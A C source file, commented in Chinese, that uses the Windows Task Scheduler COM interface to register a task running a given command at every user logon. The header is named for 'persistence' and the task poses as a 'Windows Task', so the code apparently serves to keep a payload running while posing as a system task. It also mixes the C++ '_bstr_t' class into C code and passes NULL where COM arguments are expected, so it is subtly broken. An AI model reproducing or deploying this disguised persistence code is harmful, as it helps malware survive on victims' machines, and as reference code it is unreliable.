#include <stdio.h>
#include <windows.h>
#include "windows_persistence_scheduler.h"

void setup_task_scheduler(const char* taskName, const char* command) {
    HRESULT hr;
    ITaskService *pService = NULL;
    ITaskFolder *pRootFolder = NULL;
    ITaskDefinition *pTask = NULL;
    IRegistrationInfo *pRegInfo = NULL;
    ITriggerCollection *pTriggerCollection = NULL;
    ITrigger *pTrigger = NULL;
    IActionCollection *pActionCollection = NULL;
    IAction *pAction = NULL;
    IExecAction *pExecAction = NULL;
    IRegisteredTask *pRegisteredTask = NULL;

    // 初始化COM库
    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // 创建任务服务实例
    hr = CoCreateInstance(&CLSID_TaskScheduler,
                          NULL,
                          CLSCTX_INPROC_SERVER,
                          &IID_ITaskService,
                          (void**)&pService);

    if (FAILED(hr)) {
        printf("Failed to create an instance of ITaskService: %x\n", hr);
        goto Cleanup;
    }

    // 连接到本地计划任务服务
    hr = pService->lpVtbl->Connect(pService, NULL, NULL, NULL, NULL);
    if (FAILED(hr)) {
        printf("ITaskService::Connect failed: %x\n", hr);
        goto Cleanup;
    }

    // 获取任务文件夹
    hr = pService->lpVtbl->GetFolder(pService, L"\\", &pRootFolder);
    if (FAILED(hr)) {
        printf("Cannot get root folder pointer: %x\n", hr);
        goto Cleanup;
    }

    // 创建任务定义
    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) {
        printf("Failed to create a task definition: %x\n", hr);
        goto Cleanup;
    }

    // 设置任务注册信息
    pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
    pRegInfo->lpVtbl->put_Author(pRegInfo, L"Windows Task");

    // 创建触发器
    pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
    pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_LOGON, &pTrigger);

    // 创建动作
    pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
    pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
    pAction->lpVtbl->QueryInterface(pAction, &IID_IExecAction, (void**)&pExecAction);
    pExecAction->lpVtbl->put_Path(pExecAction, _bstr_t(command));

    // 注册任务
    hr = pRootFolder->lpVtbl->RegisterTaskDefinition(pRootFolder,
                                                     _bstr_t(taskName),
                                                     pTask,
                                                     TASK_CREATE_OR_UPDATE,
                                                     NULL,
                                                     NULL,
                                                     TASK_LOGON_INTERACTIVE_TOKEN,
                                                     &pRegisteredTask);
    if (FAILED(hr)) {
        printf("Error saving the Task : %x\n", hr);
        goto Cleanup;
    }

    printf("Task successfully scheduled\n");

Cleanup:
    if (pService) pService->lpVtbl->Release(pService);
    if (pRootFolder) pRootFolder->lpVtbl->Release(pRootFolder);
    if (pTask) pTask->lpVtbl->Release(pTask);
    if (pRegInfo) pRegInfo->lpVtbl->Release(pRegInfo);
    if (pTriggerCollection) pTriggerCollection->lpVtbl->Release(pTriggerCollection);
    if (pTrigger) pTrigger->lpVtbl->Release(pTrigger);
    if (pActionCollection) pActionCollection->lpVtbl->Release(pActionCollection);
    if (pAction) pAction->lpVtbl->Release(pAction);
    if (pExecAction) pExecAction->lpVtbl->Release(pExecAction);
    if (pRegisteredTask) pRegisteredTask->lpVtbl->Release(pRegisteredTask);

    CoUninitialize();
}
